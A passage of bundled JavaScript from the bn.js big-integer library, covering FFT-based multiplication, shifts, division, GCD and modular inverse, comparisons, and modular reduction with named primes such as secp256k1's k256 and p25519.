                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : a.umod(this.m)._forceRed(this);
                    }),
                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
